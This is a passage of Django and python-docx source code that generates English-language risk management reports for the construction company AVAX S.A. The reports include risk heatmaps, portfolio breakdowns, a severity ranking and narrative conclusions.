        'of activities. These risks include working in hazardous areas, using heavy machinery, and executing complex construction processes, '
        'all of which create challenging conditions for project safety and consistency. Systematic monitoring of these risks is essential for successful project management and accident prevention.'
    )

    # Section for Residual Risk Score
    document.add_heading('\nResidual Project Risk Scores', level=2)
    paragraph3 = document.add_paragraph()
    run3 = paragraph3.add_run('\nThe Residual Project Risk Score ')
    run3.bold = True
    run4 = paragraph3.add_run(
        'represents the risk that remains after applying mitigation measures. Despite significant risk reduction through mitigations, '
        'some risks still require ongoing monitoring to maintain safety and ensure successful project execution.'
    )

    document.add_page_break()

    # Explanation of Heatmaps
    document.add_paragraph(
        'The following heatmaps illustrate the distribution of risks based on Likelihood and Impact, providing an overall view of project risks at different severity levels.'
    )
    
    document.add_paragraph(
        'By comparing the Inherent and Residual Risk Score heatmaps, it becomes clear how risks have been reduced through mitigation measures, '
        'allowing risks to transition into less severe categories and supporting project safety and smooth progress.'
    )

    # Generate and insert the Inherent Risk Heatmap
    inherent_heatmap_base64, inherent_count_matrix, inherent_score_matrix = generate_heatmap_image(
        'Inherent Project Risk Scores Heatmap', inherent_data, 'inherent'
    )
    document.add_picture(io.BytesIO(base64.b64decode(inherent_heatmap_base64)), width=Inches(4))

    # Generate and insert the Residual Risk Heatmap
    residual_heatmap_base64, residual_count_matrix, residual_score_matrix = generate_heatmap_image(
        'Residual Project Risk Scores Heatmap', residual_data, 'residual'
    )
    document.add_picture(io.BytesIO(base64.b64decode(residual_heatmap_base64)), width=Inches(4))

    # Section for Targeted Risk Score
    document.add_heading('\nTargeted Project Risk Scores', level=2)
    paragraph5 = document.add_paragraph()
    run5 = paragraph5.add_run('\nThe Targeted Project Risk Score ')
    run5.bold = True
    run6 = paragraph5.add_run(
        'defines the desired level of risk to be achieved within the project framework through additional mitigation measures and improvement strategies. '
        'The aim is to reduce the risk to an acceptable level that ensures safety, efficiency, and successful project completion in line with organizational standards.'
    )

    # Additional explanation about Targeted Risk Score
    paragraph6 = document.add_paragraph(
        'The Targeted Project Risk Score reflects the organization’s commitment to continuous improvement, ensuring that risks are maintained at levels that support both safety and the achievement of project objectives.'
    )

    # Generate and insert the Targeted Risk Heatmap
    targeted_heatmap_base64, targeted_count_matrix, targeted_score_matrix = generate_heatmap_image(
        'Targeted Project Risk Scores Heatmap', targeted_data, 'targeted'
    )
    document.add_picture(io.BytesIO(base64.b64decode(targeted_heatmap_base64)), width=Inches(4))

    
  

    # Decode and add the chart image to the document
   
    chart_image_base64 = generate_portfolio_category_risk_chart(selected_portfolios)


    
    chart_image_data = base64.b64decode(chart_image_base64.split(",")[1])
    chart_image_io = io.BytesIO(chart_image_data)
    document.add_paragraph("Risk Levels by Category for Selected Portfolios", style='Heading 2')
    document.add_picture(chart_image_io, width=Inches(7))

    # Page break after the summary
    document.add_page_break()
    add_residual_risk_list_section_en(document,selected_portfolios)

    add_residual_risk_pivot_section_en(document, selected_portfolios)


# views.py
from django.shortcuts import render
from django.http import HttpResponse
from .models import Portfolio  # Assuming Portfolio is your model

@permission_required('orm.can_view_reports', raise_exception=True)
def generate_project_risk_report_en(request):
    if request.method == "POST":
        # Gather selected portfolios from user input
        selected_portfolio_ids = request.POST.getlist('portfolios')
        selected_portfolios = Portfolio.objects.filter(id__in=selected_portfolio_ids)

        # Calculate total risks based on selected portfolios
        from django.db.models import Q

        risks = Risk.objects.filter(portfolio__in=selected_portfolios).exclude(
            Q(portfolio__name__icontains='archive')
            # Q(portfolio__name__icontains='sub') | 
            # Q(portfolio__name__icontains='set')
        )



        total_risks = risks.count()

        # Initialize risk data matrices for heatmaps
        inherent_data = [[[] for _ in range(5)] for _ in range(5)]
        residual_data = [[[] for _ in range(5)] for _ in range(5)]
        targeted_data = [[[] for _ in range(5)] for _ in range(5)]

        # Populate each risk data matrix with appropriate scores
        for risk in risks:
            inherent_data[risk.inherent_likelihood - 1][risk.inherent_impact - 1].append(risk)
            residual_data[risk.residual_likelihood - 1][risk.residual_impact - 1].append(risk)
            targeted_data[risk.targeted_likelihood - 1][risk.targeted_impact - 1].append(risk)

        # Path to the logo
        logo_path = finders.find('images/avax-logo.jpeg')
        if not logo_path:
            raise FileNotFoundError('Logo file not found in static/images.')

        # Prepare document and add sections
        buffer = BytesIO()
        with zipfile.ZipFile(buffer, 'w') as zip_archive:
            main_report = Document()
            set_calibri_font(main_report)
            add_project_risk_cover_page_en(main_report, logo_path, selected_portfolios)  # Cover page

            # Pass selected portfolios, total risks, and matrices for heatmap generation to executive summary
            add_table_of_contents_en(main_report)  # Table of Contents

            add_executive_summary_project_en(
                main_report,
                selected_portfolios,
                total_risks,
                inherent_data,
                residual_data,
                targeted_data
            )
            
            add_page_numbers_en(main_report)

            # Save and add the document to the ZIP archive
            main_report_io = BytesIO()
            main_report.save(main_report_io)
            main_report_io.seek(0)
            zip_archive.writestr(f'project_risk_report_ENGLISH.docx', main_report_io.read())

        # Set the buffer position and return the response
        buffer.seek(0)
        response = HttpResponse(buffer, content_type='application/zip')
        response['Content-Disposition'] = f'attachment; filename="project_risk_report_ENGLISH.zip"'
        return response


def add_page_numbers_en(document):
    section = document.sections[0]
    footer = section.footer.paragraphs[0]

    # Add page numbering on the left
    footer.text = "Page "
    run = footer.add_run()
    fldChar = OxmlElement('w:fldChar')
    fldChar.set(qn('w:fldCharType'), 'begin')

    instrText = OxmlElement('w:instrText')
    instrText.set(qn('xml:space'), 'preserve')
    instrText.text = "PAGE"
    fldChar2 = OxmlElement('w:fldChar')
    fldChar2.set(qn('w:fldCharType'), 'end')
    run._r.append(fldChar)
    run._r.append(instrText)
    run._r.append(fldChar2)

    footer.add_run(" of ")
    run = footer.add_run()
    fldChar = OxmlElement('w:fldChar')
    fldChar.set(qn('w:fldCharType'), 'begin')

    instrText = OxmlElement('w:instrText')
    instrText.set(qn('xml:space'), 'preserve')
    instrText.text = "NUMPAGES"
    fldChar2 = OxmlElement('w:fldChar')
    fldChar2.set(qn('w:fldCharType'), 'end')
    run._r.append(fldChar)
    run._r.append(instrText)
    run._r.append(fldChar2)

    # Add a new paragraph for the "Confidential for internal use" text in English
    center_paragraph = section.footer.add_paragraph()
    center_paragraph.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER
    center_run = center_paragraph.add_run("Confidential for internal use")
    center_run.bold = True



def add_cover_page_en(document):
    # Add some vertical space
    document.add_paragraph('\n' * 5)  # Adds space at the top of the page.

    # Add title with centered alignment
    paragraph = document.add_paragraph()
    paragraph.alignment = 1  # Center alignment
    run = paragraph.add_run('Risk Management Report')
    run.bold = True
    run.font.size = Pt(24)

    # Centered subtexts
    paragraph = document.add_paragraph()
    paragraph.alignment = 1  # Center alignment
    run = paragraph.add_run('Presentation to the Risk Management Committee / Board of Directors')
    run.font.size = Pt(14)

    paragraph = document.add_paragraph()
    paragraph.alignment = 1  # Center alignment
    run = paragraph.add_run('AVAX S.A.')
    run.font.size = Pt(14)

    paragraph = document.add_paragraph()
    paragraph.alignment = 1  # Center alignment
    run = paragraph.add_run(f'Year: ')
    run.font.size = Pt(14)

    paragraph = document.add_paragraph()
    paragraph.alignment = 1  # Center alignment
    run = paragraph.add_run('Prepared by: Risk Management Unit')
    run.font.size = Pt(14)

    # Add another page break
    document.add_page_break()



def add_table_of_contents_en(document):
    # Add a heading for the Table of Contents
    toc_heading = document.add_paragraph('Table of Contents', style='Heading 2')

    # Create the TOC field element
    paragraph = document.add_paragraph()
    run = paragraph.add_run()

    # Add field code for TOC (Word requires the document to be updated to show the TOC)
    fldChar1 = OxmlElement('w:fldChar')
    fldChar1.set(qn('w:fldCharType'), 'begin')
    run._r.append(fldChar1)

    instrText = OxmlElement('w:instrText')
    instrText.set(qn('xml:space'), 'preserve')
    instrText.text = 'TOC \\o "1-1" \\h \\z \\u'  # TOC field code for level 1 only
    run._r.append(instrText)

    fldChar2 = OxmlElement('w:fldChar')
    fldChar2.set(qn('w:fldCharType'), 'end')
    run._r.append(fldChar2)



def generate_conclusion_en(inherent_count_matrix, inherent_score_matrix,
                        residual_count_matrix, residual_score_matrix,
                        targeted_count_matrix, targeted_score_matrix, doc):
    # Calculate the total number of risks across all matrices
    total_risks = np.sum(inherent_count_matrix)

    # Identify high-level risks (Residual Risk Score >= 15)
    inherent_high_risks = np.sum(inherent_count_matrix[inherent_score_matrix >= 15])
    residual_high_risks = np.sum(residual_count_matrix[residual_score_matrix >= 15])
    targeted_high_risks = np.sum(targeted_count_matrix[targeted_score_matrix >= 15])

    # Identify medium-level risks (Inherent Risk Score 7-14)
    inherent_medium_risks = np.sum(inherent_count_matrix[(inherent_score_matrix >= 7) & (inherent_score_matrix <= 14)])
    residual_medium_risks = np.sum(residual_count_matrix[(residual_score_matrix >= 7) & (residual_score_matrix <= 14)])
    targeted_medium_risks = np.sum(targeted_count_matrix[(targeted_score_matrix >= 7) & (targeted_score_matrix <= 14)])

    # Identify low-level risks (Targeted Risk Score <= 6)
    inherent_low_risks = np.sum(inherent_count_matrix[inherent_score_matrix <= 6])
    residual_low_risks = np.sum(residual_count_matrix[residual_score_matrix <= 6])
    targeted_low_risks = np.sum(targeted_count_matrix[targeted_score_matrix <= 6])

    # Summary section
    doc.add_paragraph("\nConclusions", style='Heading 2')
    doc.add_paragraph(
        f"\nIn total, {total_risks} risks were identified during the risk assessment process. "
        "This analysis examines the distribution of risks based on inherent, residual, and targeted assessments."
    )

    # Overview of inherent risks
    doc.add_paragraph(
        f"In the inherent assessment, {inherent_high_risks} high-level risks, "
        f"{inherent_medium_risks} medium-level risks, and {inherent_low_risks} low-level risks were identified."
    )

    # Overview of residual risks
    doc.add_paragraph(
        f"After implementing mitigation strategies, high-level residual risks were reduced to {residual_high_risks} "
        f"(from {inherent_high_risks}). Medium-level risks adjusted to {residual_medium_risks} "
        f"(up from {inherent_medium_risks}), while low-level risks increased to {residual_low_risks} "
        f"(up from {inherent_low_risks})."
    )

    # Overview of targeted risks
    doc.add_paragraph(
        f"In the targeted assessment, {targeted_high_risks} high-level risks remain "
        f"(down from {residual_high_risks} in the residual stage), with {targeted_medium_risks} medium-level risks "
        f"(down from {residual_medium_risks}) and {targeted_low_risks} low-level risks (up from {residual_low_risks})."
    )

    # Final Observations based on analysis
    doc.add_paragraph("\nObservations\n", style='Heading 2')

    # High risks
    if residual_high_risks > 0:
        doc.add_paragraph(
            f"It is notable that {residual_high_risks} high-risk areas require ongoing monitoring for enhanced mitigation."
        )
    else:
        doc.add_paragraph(
            "The evaluation indicates that mitigation strategies have successfully eliminated high-level risks, achieving significant improvement."
        )

    # Medium risks
    if residual_medium_risks > inherent_medium_risks:
        doc.add_paragraph(
            f"The increase in medium-level risks to {residual_medium_risks} from {inherent_medium_risks} reflects the transition from higher risks, "
            "indicating improvement in managing more severe risks."
        )

    # Low risks
    if residual_low_risks > inherent_low_risks:
        doc.add_paragraph(
            f"The increase in low-risk areas to {residual_low_risks} from {inherent_low_risks} demonstrates a successful shift to more controlled levels."
        )

    # Targeted risks
    if targeted_high_risks > residual_high_risks:
        doc.add_paragraph(
            f"Despite reductions, {targeted_high_risks} high-level targeted risks remain (from {residual_high_risks} in the residual stage), suggesting a need for further measure adjustments."
        )

    # Final summary
    doc.add_paragraph(
        "In conclusion, the risk analysis reveals a gradual shift toward lower severity levels, with significant improvement in high-risk areas. "
        "However, ongoing attention is required for medium-level risks."
    )

def add_risk_breakdown_graphs_en(document):
   
    document.add_page_break()

    # Example: Number of risks per portfolio
    document.add_heading('\nNumber of Risks per Portfolio', level=2)
    portfolio_graph_html = generate_portfolio_graph_gr()
    total_risks = Risk.objects.count()

    document.add_paragraph(
        "\nNumber of Risks per Portfolio: Portfolios were created based on the company’s organizational structure, aligning risks with "
        "the various departments and units within the organization."
    )

    document.add_paragraph(
        "This structure enables a more detailed analysis of risks, ensuring that each portfolio reflects the unique risk environment "
        "associated with its respective operational functions."
    )

    document.add_paragraph(
        "Additionally, portfolios include specific projects, which help to highlight risks that may affect the successful implementation "
        "and achievement of each project’s goals."
    )

    document.add_paragraph(
        "Through this analysis, it is possible to identify risks at the project level and take appropriate mitigation measures to ensure "
        "the effective operation of projects and business processes."
    )

    # Assuming total_risks is a sum of all risks across portfolios
    import re

    def clean_html_tags(text):
        return re.sub(r'<.*?>', '', text)  # Simple regex to remove HTML tags

    def add_portfolio_details(document, portfolios):
        # Filter out portfolios that contain 'archive' in their name (case-insensitive) and sort by name
        filtered_portfolios = sorted(
    [
        portfolio for portfolio in portfolios
        if not any(keyword in portfolio.name.lower() for keyword in ['archive', 'sub', 'set'])
    ],
    key=lambda portfolio: portfolio.name.lower()
)


        # Add a table with two columns: Title and Description
        table = document.add_table(rows=1, cols=2)
        table.style = 'Table Grid'

        # Set up the header row
        hdr_cells = table.rows[0].cells
        hdr_cells[0].text = 'Portfolio Title'
        hdr_cells[1].text = 'Description'

        # Add portfolio details as rows in the table
        for portfolio in filtered_portfolios:
            row_cells = table.add_row().cells
            row_cells[0].text = portfolio.name
            if portfolio.description:
                clean_description = clean_html_tags(portfolio.description)
                row_cells[1].text = clean_description
            else:
                row_cells[1].text = "No description available."

    from django.db.models import Q

    portfolios = Portfolio.objects.exclude(
        Q(name__icontains='archive') | 
        Q(name__icontains='sub') | 
        Q(name__icontains='set')
    ).order_by('name')


    add_portfolio_details(document, portfolios)

    # Insert the total_risks into the paragraph
    document.add_paragraph(
        "\nThe following analysis presents the number of risks per portfolio and their respective levels of residual risk."
    )

    
    document.add_page_break()
    
    from PIL import Image

    def rotate_image_bytes(image_bytes, degrees):
        # Open the image from bytes
        image = Image.open(io.BytesIO(image_bytes))
        # Rotate the image by the specified degrees
        rotated_image = image.rotate(degrees, expand=True)
        # Save the rotated image back into a BytesIO object
        rotated_image_io = io.BytesIO()
        rotated_image.save(rotated_image_io, format='PNG')
        rotated_image_io.seek(0)
        return rotated_image_io

    portfolio_graph_html = generate_portfolio_graph_gr()

    image_data = base64.b64decode(portfolio_graph_html.split(",")[1])
    rotated_image_io = rotate_image_bytes(image_data, 0)
    document.add_picture(rotated_image_io, width=Inches(5.4))
  
    # Example: Number of risks per owner

    document.add_heading('\nNumber of Risks per Risk Owner', level=2)
    document.add_paragraph(
        "\nEach identified risk is assigned to one or more 'Risk Owners,' who have the necessary expertise to assess "
        "the severity of the risk and suggest mitigation strategies."
    )

    document.add_paragraph(
        "The role of Risk Owners is central, as their responsibility extends to continuously monitoring "
        "risk developments, making decisions, and keeping stakeholders informed."
    )

    document.add_paragraph(
        "Using the central risk management platform (ermapp.avax.gr), Risk Owners are required to update data twice per year, "
        "confirming the adequacy of the measures taken."
    )

    document.add_paragraph(
        "At the same time, the risk management department conducts independent assessments twice a year to ensure that the proactive approach "
        "remains aligned with the organization's strategic priorities."
    )

    document.add_paragraph(
        "All information related to approvals, assessments, and changes is stored accurately in the central risk management platform (ermapp.avax.gr), "
        "ensuring full transparency and accountability in risk management."
    )



    # New paragraph for total risks information
    paragraph = document.add_paragraph(
       "The following analysis presents the number of risks per Risk Owner and their respective levels of residual risk."
    )

    # Emphasize the second part of the paragraph
    emphasized_text = (
        "The total number of risks per Risk Owner may not match the total number of risks due to the presence of multiple Risk Owners."
    )
    paragraph.add_run(emphasized_text).bold = True

    for run in paragraph.runs:
        run.font.size = Pt(12)

    owner_graph_html = generate_owner_graph_gr()  

    image_data = base64.b64decode(owner_graph_html.split(",")[1])
    rotated_image_io = rotate_image_bytes(image_data, 0)
    document.add_picture(rotated_image_io, width=Inches(5.4))

    document.add_paragraph('Risk Categories:', style='Heading 3')

    # General Risk Categories
    document.add_paragraph('Risk Categories:', style='Heading 3')
    document.add_paragraph('Financial: Risks affecting financial stability, such as cost fluctuations or funding delays.', style='List Bullet')
    document.add_paragraph('Operational: Risks from internal process weaknesses, human errors, or equipment failures.', style='List Bullet')
    document.add_paragraph('Technological: Threats from technological failures or data security breaches.', style='List Bullet')
    document.add_paragraph('Legal: Risks of non-compliance with legal and regulatory requirements.', style='List Bullet')
    document.add_paragraph('Compliance: Risks from breaches of internal policies or ethical standards.', style='List Bullet')

    
    category_graph_html = generate_category_graph_gr()

    image_data = base64.b64decode(category_graph_html.split(",")[1])
    rotated_image_io = rotate_image_bytes(image_data, 0)
    document.add_picture(rotated_image_io, width=Inches(5.4))
    
    
    document.add_paragraph(
        'General risk categorization is essential for the company’s risk management strategy. \n\nAt the project level, however, specialization is required in each category '
        'to address the unique challenges of each project and achieve objectives within budget and schedule.',
        style='BodyText'
    )

    # Project-Level Risk Analysis in Construction
    document.add_paragraph('Risk Analysis for Construction Projects:', style='Heading 3')
    document.add_paragraph(
        'In large construction projects, such as tunneling with TBM or power plant development, project-level risk analysis is essential to tailor the strategy '
        'to the specific nature and requirements of each project.\n\n Tunneling projects in densely populated areas require strict safety and compliance measures, while large infrastructure projects '
        'such as power plants require specialized supply chain management and complex technological coordination. This tailored risk management approach enhances effective '
        'risk handling and project completion within budget and schedule.',
        style='BodyText'
    )

    category_graph_html = generate_category_graph_per_project_gr()

    image_data = base64.b64decode(category_graph_html.split(",")[1])
    rotated_image_io = rotate_image_bytes(image_data, 0)
    document.add_picture(rotated_image_io, width=Inches(5.4))
  

    # Page break after the section
    document.add_page_break()
    
    


from docx.oxml import OxmlElement
from docx.oxml.ns import qn
from docx.shared import Pt, Inches
from docx.enum.text import WD_PARAGRAPH_ALIGNMENT

from django import forms
from django.utils.html import strip_tags
from docx.shared import Inches, Pt
from docx.oxml.ns import qn
from docx.oxml import OxmlElement
from docx.enum.text import WD_PARAGRAPH_ALIGNMENT

from docx.shared import Inches, Pt
from docx.oxml.ns import qn
from docx.oxml import OxmlElement
from docx.enum.text import WD_PARAGRAPH_ALIGNMENT

from docx.shared import Pt
from docx.enum.text import WD_PARAGRAPH_ALIGNMENT
from docx.oxml import OxmlElement
from docx.oxml.ns import qn
from django.utils import timezone

def add_executive_risk_severity_list_en(document):
    # Start with a page break
    document.add_page_break()
    # Executive Summary Title
    document.add_heading('\nRisk Severity List', level=1)

    # Description for the severity list with reference to Annex 1
    document.add_paragraph(
        'The table below ranks risks by severity, based on their residual risk score. The inherent, residual, and targeted '
        'risk scores represent the level of risk before and after the implementation of mitigation measures. '
        'For more details, please refer to Annex 1.'
    )

    # Retrieve and sort risks from portfolios that do not contain "archive" in their title, sorted by residual score
    from django.db.models import Q

    all_risks = (
        Risk.objects.exclude(
            Q(portfolio__name__icontains="archive") | 
            Q(portfolio__name__icontains="sub") | 
            Q(portfolio__name__icontains="set")
        )
        .select_related('portfolio')  # Remove category and just use portfolio
    )

    risks_sorted = sorted(all_risks, key=lambda r: (r.residual_likelihood or 0) * (r.residual_impact or 0), reverse=True)

    # Create a table with a title row and header rows
    table = document.add_table(rows=1, cols=6)
    table.style = 'Table Grid'

    # Define and style the header cells, and set it as a repeating header with smaller font
    hdr_cells = table.rows[0].cells
    headers = ['Rank', 'Portfolio', 'Risk Title', 'Inherent', 'Residual', 'Targeted']
    
    for cell, header in zip(hdr_cells, headers):
        cell.text = header
        run = cell.paragraphs[0].runs[0]
        run.bold = True
        run.font.size = Pt(8)  # Set font size to 8 points for compactness
        cell.paragraphs[0].alignment = WD_PARAGRAPH_ALIGNMENT.CENTER
        cell.paragraphs[0].paragraph_format.space_after = Pt(2)
        set_cell_background(cell, 'B7DEE8')  # Light blue color for header

    # Set the header row to repeat on each page by modifying the XML directly
    tr = table.rows[0]._tr
    tbl_header = OxmlElement("w:tblHeader")
    tbl_header.set(qn("w:val"), "true")
    tr.get_or_add_trPr().append(tbl_header)

    # Populate the table with sorted risks
    risk_number = 1
    today = timezone.now().date()
    for risk in risks_sorted:
        # Calculate scores
        inherent_score = (risk.inherent_likelihood or 0) * (risk.inherent_impact or 0)
        residual_score = (risk.residual_likelihood or 0) * (risk.residual_impact or 0)
        targeted_score = (risk.targeted_likelihood or 0) * (risk.targeted_impact or 0)

        # Create table row for each risk
        risk_row = table.add_row().cells
        risk_row[0].text = str(risk_number)
        risk_row[0].paragraphs[0].alignment = WD_PARAGRAPH_ALIGNMENT.CENTER

        # Add portfolio and risk title with HTML conversion
        risk_row[1].text = risk.portfolio.name if risk.portfolio else "Unassigned"
        add_html_to_word(document, risk_row[2].paragraphs[0], risk.title)  # Using HTML conversion function for risk title

        # Add scores
        score_cells = [risk_row[3], risk_row[4], risk_row[5]]
        scores = [inherent_score, residual_score, targeted_score]
        for cell, score in zip(score_cells, scores):
            cell.text = f"{score}"
            cell.paragraphs[0].alignment = WD_PARAGRAPH_ALIGNMENT.CENTER
            apply_cell_color(cell, get_score_color(score))  # Apply color based on score

        # Increment risk number
        risk_number += 1

    document.add_paragraph('\n')  # Add space after the table

def add_risk_management_process_section_en(document):
    document.add_heading('Risk Management Process', level=2)
    
    # Intro paragraph
    intro_paragraph = document.add_paragraph(
        "The ermapp.avax.gr platform supports the following risk management process, "
        "providing a structured approach to identifying, mitigating, and monitoring risks."
    )
    intro_paragraph.alignment = WD_PARAGRAPH_ALIGNMENT.JUSTIFY

    # Define the steps with descriptions in English
    steps = [
        ("Step 1: Identification", "Identify risks and assign responsibilities."),
        ("Step 2: Mitigations", "Implement strategies to reduce the impact and likelihood of risks."),
        ("Step 3: Actions", "Take actions to manage and mitigate risks."),
        ("Step 4: Indicators", "Define and monitor indicators for continuous risk tracking."),
        ("Step 5: Events", "Record and manage events related to risks."),
        ("Step 6: Opportunities", "Utilize opportunities to improve risk management."),
        ("Step 7: Approvals", "Conduct regular reviews and approvals for effective risk control.")
    ]

    # Adding each step title and description
    for step_title, step_desc in steps:
        # Step Title
        title_paragraph = document.add_paragraph(step_title)
        title_paragraph.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER
        title_run = title_paragraph.runs[0]
        title_run.bold = True
        title_run.font.size = Pt(12)

        # Step Description
        desc_paragraph = document.add_paragraph(step_desc)
        desc_paragraph.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER
        desc_paragraph.paragraph_format.space_after = Pt(10)

    # Adding Approval and Assessment status tables
    document.add_heading('Approval Status Table', level=2)
    add_status_table(document, 'approval')

    document.add_heading('Assessment Status Table', level=2)
    add_status_table(document, 'assessment')


from docx.shared import Pt
import io
import base64
from docx.oxml import OxmlElement
from docx.oxml.ns import qn
from docx.shared import RGBColor, Inches

def add_executive_summary_en(document):
    document.add_page_break()

    # Executive Summary Title
    document.add_heading('\nExecutive Summary', level=1)

    # Brief introduction to the concepts
    document.add_paragraph(
        '\nThis report provides a comprehensive analysis of risk management activities conducted during the year. '
        'The main objective of the risk management strategy for the current year was to mitigate high-priority risks '
        'and align risk management practices with the strategic objectives of the organization.'
    )

    document.add_paragraph(
        "\nThe following summary offers an overview of the risk landscape, presenting an analysis of risk scores for each category: "
        "inherent, residual, and targeted scores."
    )

    # Brief explanation of risk scoring
    document.add_heading('Risk Assessment Methodology\n', level=2)
    document.add_paragraph(
        'Each risk is assessed based on two primary dimensions: the likelihood of the risk occurring and the potential impact on the organization. '
        'The risk score is calculated by multiplying the likelihood score by the impact score. (Likelihood x Impact = Risk Score)'
    )

    # Add a table for Likelihood and Impact Scores
    table = document.add_table(rows=1, cols=3)
    table.style = 'Table Grid'

    # Set up the header row
    hdr_cells = table.rows[0].cells
    hdr_cells[0].text = 'Score'
    hdr_cells[1].text = 'Likelihood'
    hdr_cells[2].text = 'Impact'

    # Data for each score
    table_data = [
        (1, 'Very Low: Unlikely to occur', 'Minimal impact'),
        (2, 'Low: Low likelihood of occurrence', 'Limited impact'),
        (3, 'Moderate: Likely to occur', 'Notable impact'),
        (4, 'High: Likely to occur', 'Significant impact'),
        (5, 'Very High: Almost certain', 'Severe impact')
    ]

    # Add rows dynamically based on table_data
    for score, likelihood, impact in table_data:
        row_cells = table.add_row().cells
        row_cells[0].text = str(score)
        row_cells[1].text = likelihood
        row_cells[2].text = impact


    add_risk_severity_table(document)

    # Risk data initialization
    inherent_data = [[[] for _ in range(5)] for _ in range(5)]
    residual_data = [[[] for _ in range(5)] for _ in range(5)]
    targeted_data = [[[] for _ in range(5)] for _ in range(5)]

    # Retrieve and count risks from the database
    from django.db.models import Q

    risks = Risk.objects.exclude(
        Q(portfolio__name__icontains='archive') | 
        Q(portfolio__name__icontains='sub') | 
        Q(portfolio__name__icontains='set')
    )





    total_risks = risks.count()
    for risk in risks:
        inherent_data[risk.inherent_likelihood - 1][risk.inherent_impact - 1].append(risk)
        residual_data[risk.residual_likelihood - 1][risk.residual_impact - 1].append(risk)
        targeted_data[risk.targeted_likelihood - 1][risk.targeted_impact - 1].append(risk)

    # Display total number of risks
    document.add_paragraph('\n')
    paragraph = document.add_paragraph()
    paragraph.add_run('Total number of active risks for the entire AVAX Group: ').bold = True
    paragraph.add_run(f'{total_risks}').bold = True

    add_risk_management_process_section_en(document)

    # Section for Inherent Risk Score
    document.add_heading('\nInherent Risk Scores', level=2)
    paragraph1 = document.add_paragraph()
    paragraph1.add_run('\nThe Inherent Risk Score ').bold = True
    paragraph1.add_run(
        'represents the initial level of risk associated with an activity or process, without considering any mitigation measures.'
    )

    # Additional explanation for inherent risks
    paragraph2 = document.add_paragraph(
        'In the construction sector, inherent risks are particularly elevated due to the nature of the work. '
        'These risks include working at heights, using heavy machinery and equipment, and performing complex structural processes. '
        'These factors are integral to daily operations, requiring continuous assessment and attention to protect worker safety and ensure project completion.'
    )

    # Section for Residual Risk Score
    document.add_heading('\nResidual Risk Scores', level=2)
    paragraph3 = document.add_paragraph()
    paragraph3.add_run('\nThe Residual Risk Score ').bold = True
    paragraph3.add_run(
        'evaluates the risk that remains after implementing mitigation measures. Although these measures help reduce risk, '
        'certain risks remain and must be monitored.'
    )

    # Comparison of residual and inherent risk
    paragraph4 = document.add_paragraph(
        'The comparison between Residual and Inherent Risk Scores highlights the effectiveness of mitigation measures, '
        'ensuring that remaining risks are at acceptable levels.'
    )

    # Heatmap explanation
    document.add_paragraph(
        'The following heatmaps illustrate the number of risks for each combination of Likelihood x Impact, showing the risk distribution across different severity levels.'
    )
    document.add_paragraph(
        'By comparing Inherent and Residual Risk Scores heatmaps, we observe how risks shift into less severe categories due to mitigation, '
        'providing an indication of the effectiveness of the risk management strategies applied.'
    )

    # Inherent Risk Heatmap
    inherent_heatmap_base64, inherent_count_matrix, inherent_score_matrix = generate_heatmap_image(
        'Inherent Risk Scores Heatmap', inherent_data, 'inherent'
    )
    document.add_picture(io.BytesIO(base64.b64decode(inherent_heatmap_base64)), width=Inches(5))

    # Residual Risk Heatmap
    residual_heatmap_base64, residual_count_matrix, residual_score_matrix = generate_heatmap_image(
        'Residual Risk Scores Heatmap', residual_data, 'residual'
    )
    document.add_picture(io.BytesIO(base64.b64decode(residual_heatmap_base64)), width=Inches(5))

    document.add_page_break()

    # Section for Targeted Risk Score
    document.add_heading('\nTargeted Risk Scores', level=2)
    paragraph5 = document.add_paragraph()
    paragraph5.add_run('\nThe Targeted Risk Score ').bold = True
    paragraph5.add_run(
        'defines the desired level of risk the organization aims to achieve through the application of additional mitigation measures and improvement strategies. '
        'The goal is to further reduce risk to a level that is considered acceptable for operation and compliance.'
    )

    # Additional explanation for targeted risk
    paragraph6 = document.add_paragraph(
        'The Targeted Risk Score reflects the organization’s commitment to continuous improvement in safety and efficiency.'
    )

    targeted_heatmap_base64, targeted_count_matrix, targeted_score_matrix = generate_heatmap_image(
        'Targeted Risk Scores Heatmap', targeted_data, 'targeted'
    )
    document.add_picture(io.BytesIO(base64.b64decode(targeted_heatmap_base64)), width=Inches(5))

    # Insert breakdown and conclusion sections as needed
    add_risk_breakdown_graphs_en(document)
    
    generate_conclusion_en(
        inherent_count_matrix, inherent_score_matrix,
        residual_count_matrix, residual_score_matrix,
        targeted_count_matrix, targeted_score_matrix,
        document
    )

    document.add_page_break()


from docx.shared import RGBColor
from django.utils import timezone

from docx.shared import RGBColor
from django.utils import timezone

def add_risks_by_portfolio_en(document):
    # Start a new page and add a section title for the "Risks by Portfolio"
    document.add_page_break()
    document.add_heading('\nAnnex 1: Detailed Risk Report by Portfolio', level=1)

    portfolios = Portfolio.objects.exclude(
    Q(name__icontains='archive') | 
    Q(name__icontains='sub') | 
    Q(name__icontains='set')
).order_by('name')

    for portfolio in portfolios:
        # Start a new page for each portfolio
        document.add_page_break()

        # Add the portfolio title with Heading 2
        document.add_paragraph(f'Portfolio: {portfolio.name}', style='Heading 2')

        def clean_html_tags(text):
            return re.sub(r'<.*?>', '', text)  # Simple regex to remove HTML tags

        # Add the portfolio description with cleaned HTML content
        if portfolio.description:
            clean_description = clean_html_tags(portfolio.description)
            document.add_paragraph(clean_description)

        # Fetch the risks for each portfolio
        risks = Risk.objects.filter(portfolio=portfolio)

        for risk in risks:
            # Create a table to hold all the content
            table = document.add_table(rows=0, cols=3)  # Use 3 columns where it makes sense

            # Line 1: Risk Title (spanning all columns in one row)
            title_row = table.add_row().cells
            title_row[0].merge(title_row[1]).merge(title_row[2])  # Merge the 3 columns
            title_row[0].paragraphs[0].add_run(f'Risk: {risk.title}').bold = True

            # Line 2: Risk Description (spanning all columns in one row)
            description_row = table.add_row().cells
            description_row[0].merge(description_row[1]).merge(description_row[2])  # Merge the 3 columns
            description_row[0].paragraphs[0].add_run(f'Description: {clean_html_tags(risk.description)}')

            # Line 3: Inherent, Residual, and Targeted Scores (each in a separate cell)
            score_row = table.add_row().cells
            score_row[0].paragraphs[0].add_run('Inherent:').bold = True
            format_risk_score(
                score_row[0].paragraphs[0].add_run(),
                risk.inherent_likelihood,
                risk.inherent_impact,
                risk.inherent_score(),
                risk.inherent_traffic_light()[0],
                risk.inherent_traffic_light()[1]
            )

            score_row[1].paragraphs[0].add_run('Residual:').bold = True
            format_risk_score(
                score_row[1].paragraphs[0].add_run(),
                risk.residual_likelihood,
                risk.residual_impact,
                risk.residual_score(),
                risk.residual_traffic_light()[0],
